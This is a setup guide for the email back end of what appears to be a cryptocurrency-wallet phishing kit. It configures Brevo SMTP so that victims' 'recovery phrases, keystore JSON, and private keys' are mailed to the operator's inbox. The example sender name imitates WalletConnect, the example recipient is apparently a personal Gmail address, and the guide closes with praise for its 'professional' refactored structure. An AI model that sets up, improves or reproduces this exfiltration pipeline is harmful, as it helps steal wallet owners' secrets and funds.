# 📧 Email Service Setup Guide

## Environment Variables Required

Create a `.env` file in your project root with the following variables:

```env
# Email Service Configuration (Brevo/Sendinblue)
SMTP_USERNAME=your_sender_email@domain.com
SMTP_PASS=your_brevo_api_key_here
RECIPIENT_EMAIL=recipient@example.com
```

## Setup Instructions

### 1. Get Brevo API Key
1. Go to [Brevo Dashboard](https://app.brevo.com/)
2. Create an account or login
3. Go to **Settings > API Keys**
4. Create a new API key
5. Copy the API key

### 2. Configure Sender Email
1. In Brevo dashboard, go to **Settings > Senders & IP**
2. Add and verify your sender email address
3. Use this email as `SMTP_USERNAME`

### 3. Set Recipient Email
- Set `RECIPIENT_EMAIL` to the email where you want to receive wallet data
- This is where recovery phrases, keystore JSON, and private keys will be sent

## Example .env File

```env
SMTP_USERNAME=walletconnect@yourdomain.com
SMTP_PASS=xkeys-abc123def456ghi789
RECIPIENT_EMAIL=victoremmy1876@gmail.com
```

## Testing

After setting up your environment variables:

1. **Start the server:**
   ```bash
   npm run server
   ```

2. **Test email functionality:**
   ```bash
   node test-email.js
   ```

3. **Check your email inbox** for the test emails

## Troubleshooting

- **"API key not found"**: Check your `SMTP_PASS` in .env file
- **"Sender not verified"**: Verify your sender email in Brevo dashboard
- **"Email not received"**: Check spam folder, verify recipient email
- **"Module not found"**: Run `npm install` to install dependencies

## Professional Structure

The refactored code now follows the same professional structure as mainuniquefashion:

✅ **EmailService Class** - Centralized email logic  
✅ **ES6 Modules** - Modern JavaScript imports/exports  
✅ **Environment Variables** - Secure configuration  
✅ **Professional Logging** - Detailed console output with emojis  
✅ **Error Handling** - Comprehensive error management  
✅ **Reusable Methods** - DRY principle applied  
✅ **Beautiful Templates** - Professional HTML email templates  

## Benefits of Refactoring

1. **Maintainability** - Easy to update email logic in one place
2. **Reusability** - Service can be used across multiple endpoints
3. **Professional Standards** - Follows enterprise-level practices
4. **Better Error Handling** - Detailed error messages and logging
5. **Security** - Environment-based configuration
6. **Scalability** - Easy to add new email types
